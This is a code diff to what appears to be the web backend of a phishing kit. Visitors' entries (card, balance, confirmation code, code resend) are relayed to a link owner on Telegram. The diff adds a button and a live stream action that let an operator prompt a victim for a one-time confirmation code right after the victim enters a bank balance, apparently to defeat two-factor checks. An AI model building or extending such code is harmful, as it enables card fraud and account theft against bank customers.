@@ -112,7 +112,7 @@ class VisitorMessage(BaseModel):
     subdomain: str
     link_id: str
     step: int | None = None
-    trigger: str | None = None   # open | card | balance | error | user
+    trigger: str | None = None   # open | card | balance | error | user | code | code_resend
     text: str = ""
 
 
@@ -244,6 +244,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         "balance": "💰 ввёл сумму баланса",
         "error": "⚠️ получил ошибку",
         "user": "✍️ написал сообщение",
+        "code": "🔑 ввёл код подтверждения",
+        "code_resend": "🔄 запросил повторную отправку кода",
     }.get(body.trigger or "user", "✍️ написал сообщение")
 
     is_new_marker = ""
@@ -277,6 +279,15 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         ]]
     }
 
+    # for balance trigger — add "Запросить код" button
+    if body.trigger == "balance":
+        reply_kb["inline_keyboard"].append([
+            {
+                "text": "🔑 Запросить код",
+                "callback_data": f"wchat_reqcode:{body.session_id}"
+            }
+        ])
+
     # owner of the link gets the notification; fall back to global admin
     notify_id = owner_tg_id or ADMIN_ID or NOTIFY_CHAT_ID
     if notify_id:
@@ -293,10 +304,13 @@ async def chat_stream(session_id: str):
         yield f"data: connected\n\n"
         while True:
             try:
-                reply = await pop_operator_reply(session_id, timeout=15)
+                reply = await pop_operator_reply(session_id, timeout=25)
                 if reply is not None:
                     import json as _json
-                    payload = _json.dumps({"text": reply}, ensure_ascii=False)
+                    if reply == "__request_code__":
+                        payload = _json.dumps({"action": "request_code"}, ensure_ascii=False)
+                    else:
+                        payload = _json.dumps({"text": reply}, ensure_ascii=False)
                     yield f"data: {payload}\n\n"
                 else:
                     yield f": ping\n\n"
@@ -310,10 +324,8 @@ async def chat_stream(session_id: str):
         event_gen(),
         media_type="text/event-stream",
         headers={
-            "Cache-Control": "no-cache, no-transform",
-            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
             "X-Accel-Buffering": "no",
-            "Transfer-Encoding": "chunked",
         },
     )
 
